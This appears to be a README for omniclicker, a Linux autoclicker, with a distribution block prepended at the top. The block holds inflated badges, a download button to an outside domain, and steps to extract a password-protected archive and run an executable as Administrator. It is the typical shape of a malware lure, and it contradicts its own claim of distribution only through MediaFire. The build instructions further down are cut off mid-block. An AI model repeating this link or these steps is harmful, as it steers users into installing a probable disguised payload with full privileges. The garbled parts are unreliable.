<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# omniclicker

A native Linux autoclicker with support for X11 and modern Wayland desktops.

omniclicker aims to provide a simple, clean, and intuitive autoclicking experience while supporting desktop environments where many other autoclickers don't work.

## Why omniclicker?

Many Linux autoclickers only support X11 or require manual setup for specific Wayland compositors.

omniclicker is designed to work out of the box. It automatically uses the most appropriate backend for your desktop environment, providing native support for X11, KDE Plasma, GNOME, Sway, and Hyprland through desktop-specific integrations where available.

The goal is simple: install it, choose your settings, and start clicking.
## Features

* Native Linux application written in C++
* Supports X11
* Supports Wayland:
    * KDE Plasma
    * GNOME
    * Hyprland
    * Niri
    * Sway
* Configurable click interval and randomization(optional)
* Left, right and scroll wheel mouse click support + custom keys 
* Global shortcut/hotkey support
* Run in background support
* Multiple clicking profiles
* Optional overlay when clicking
* Hold click/key option
* Clean and simple Qt6 interface
* No Electron or web technologies

## Installation

### Install from AUR for Arch linux

yay -S omniclicker

#### or 

paru -S omniclicker

### Build from source

#### Dependencies

You need:

* CMake
* A C++17 compiler
* Qt 6
* X11 libraries
* libXtst
* layer-shell-qt

On **Debian / Ubuntu** based distributions:

```bash
sudo apt install cmake build-essential qt6-base-dev libx11-dev libxtst-dev
```

On **Arch**:

```bash
sudo pacman -S cmake gcc qt6-base libx11 libxtst layer-shell-qt
```

Optional KDE Plasma support:

```bash
sudo pacman -S kglobalaccel
```

On **Fedora**:

```bash
sudo dnf install cmake gcc-c++ qt6-qtbase-devel libX11-devel libXtst-devel layer-shell-qt
```

On **openSUSE**:

```bash
sudo zypper install cmake gcc-c++ libqt6-qtbase-devel libX11-devel libXtst-devel layer-shell-qt
```

### Build

Clone the repository:

```bash
### Install

```bash
cmake --install build
```

## Contributing

Contributions, bug reports, and suggestions are welcome.

If omniclicker doesn't work correctly on your desktop environment, please open an issue and include:

* Your desktop environment/compositor
* Your session type (X11 or Wayland)
* Any error messages

## License

omniclicker is licensed under the GNU General Public License v3.0 or later.


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
